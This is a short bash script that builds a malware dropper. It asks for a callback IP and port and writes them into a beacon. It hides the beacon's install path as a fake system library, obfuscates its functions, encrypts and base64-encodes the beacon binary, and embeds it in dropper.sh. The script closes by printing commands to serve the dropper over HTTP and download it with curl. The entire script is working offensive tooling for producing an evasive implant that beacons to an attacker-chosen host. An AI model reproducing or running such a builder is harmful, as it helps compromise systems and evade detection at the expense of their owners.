#!/bin/bash

# Move templates
cp real_beacon.blank real_beacon 
cp final_functions.blank final_functions
cp dropper.sh.blank dropper.sh


read -p "IP to beacon 2: " IP
read -p "Port #: " PORT
Path=${Path1:-"/usr/lib64/libda-5.3.so"}
echo $IP:$PORT @ $Path

#sed -i "s/IP/$IP/g" final_functions
sed -i "s/PORT/$PORT/g" final_functions
sed -i "s/PATH/$Path/g" final_functions

sed -i "s/IP/$IP/g" real_beacon
sed -i "s/PORT/$PORT/g" real_beacon

./function_obfuscater.sh "userIDs" 18 "final_functions" "y" "m" "2" > /tmp/obf_out.txt
sed -i "/EFUNCTIONS/r /tmp/obf_out.txt" dropper.sh
sed -i "/EFUNCTIONS/d" dropper.sh

cp real_beacon bad
./bincrypter.sh bad
base64 bad > /tmp/obf_out.txt
awk '
    FILENAME == "/tmp/obf_out.txt" { obf = obf $0 "\n"; next }
    { gsub(/MFUNCTIONS/, obf); print }
' /tmp/obf_out.txt dropper.sh > /tmp/result.sh && mv /tmp/result.sh dropper.sh

echo dropper.sh is now ready
echo "-----------------------"
echo python -m http.server 8080
echo "curl $(ifconfig eth0 | grep inet | cut -d" " -f10 | head -1):8080/dropper.sh -O"
